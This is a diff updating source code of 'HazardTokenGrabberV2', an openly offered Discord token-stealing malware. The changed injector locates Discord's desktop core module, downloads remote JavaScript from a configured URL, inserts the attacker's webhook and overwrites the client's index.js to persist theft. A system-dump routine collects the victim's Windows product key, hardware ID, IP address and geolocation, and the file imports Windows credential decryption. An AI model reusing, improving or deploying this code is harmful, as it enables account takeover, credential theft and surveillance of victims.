@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.7.7'
+__version__ = '1.7.8'
 __license__ = "GPL-3.0"
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -241,33 +241,33 @@ class HazardTokenGrabberV2(Functions):
     async def injector(self):
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
-                discord = self.appdata + self.sep + _dir
-                disc_sep = discord + self.sep
-                for __dir in os.listdir(os.path.abspath(discord)):
-                    if match(r'app-(\d*\.\d*)*', __dir):
-                        app = os.path.abspath(disc_sep + __dir)
-                        inj_path = app + '\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
-                        if os.path.exists(inj_path):
-                            if self.startup_loc not in argv[0]:
-                                try:
-                                    os.makedirs(
-                                        inj_path + 'initiation', exist_ok=True)
-                                except PermissionError:
-                                    pass
-                            if self.hook_reg in self.webhook:
-                                f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
-                            else:
-                                f = httpx.get(
-                                    self.fetch_conf('injection_url')).text.replace(
-                                    "%WEBHOOK%", self.webhook).replace(
-                                    "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
-                            try:
-                                with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
-                                    indexFile.write(f)
-                            except PermissionError:
-                                pass
-                            if self.fetch_conf('kill_processes'):
-                                os.startfile(app + self.sep + _dir + '.exe')
+                discord = self.appdata + os.sep + _dir
+                for _dir in os.listdir(os.path.abspath(discord)):
+                    if match(r'app-(\d*\.\d*)*', _dir):
+                        app = os.path.abspath(os.path.join(discord, _dir, 'modules'))
+                        for __dir in os.listdir(app):
+                            if match(r"discord_desktop_core-\d*", __dir):
+                                inj_path = app + os.sep + __dir + f'\\discord_desktop_core\\'
+                                if os.path.exists(inj_path):
+                                    if self.startup_loc not in argv[0]:
+                                        try:
+                                            os.makedirs(inj_path + 'initiation', exist_ok=True)
+                                        except PermissionError:
+                                            pass
+                                    if self.hook_reg in self.webhook:
+                                        f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                                    else:
+                                        f = httpx.get(
+                                            self.fetch_conf('injection_url')).text.replace(
+                                            "%WEBHOOK%", self.webhook).replace(
+                                            "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
+                                    try:
+                                        with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
+                                            indexFile.write(f)
+                                    except PermissionError:
+                                        pass
+                                    if self.fetch_conf('kill_processes'):
+                                        os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
         blackListedPrograms = self.fetch_conf('blackListedPrograms')
@@ -499,23 +499,23 @@ class HazardTokenGrabberV2(Functions):
 
     def sys_dump(self):
         about = f"""
-        ==========================
-        {Victim} | {Victim_pc}
-        ==========================
-        Windows key: {self.winkey}
-        Windows version: {self.winver}
-        ==========================
-        RAM: {ram}GB
-        DISK: {disk}GB
-        HWID: {self.hwid}
-        ==========================
-        IP: {self.ip}
-        City: {self.city}
-        Country: {self.country}
-        Region: {self.region}
-        Org: {self.org}
-        GoogleMaps: {self.googlemap}
-        ==========================
+==========================
+{Victim} | {Victim_pc}
+==========================
+Windows key: {self.winkey}
+Windows version: {self.winver}
+==========================
+RAM: {ram}GB
+DISK: {disk}GB
+HWID: {self.hwid}
+==========================
+IP: {self.ip}
+City: {self.city}
+Country: {self.country}
+Region: {self.region}
+Org: {self.org}
+GoogleMaps: {self.googlemap}
+==========================
         """
         with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
             f.write(about)
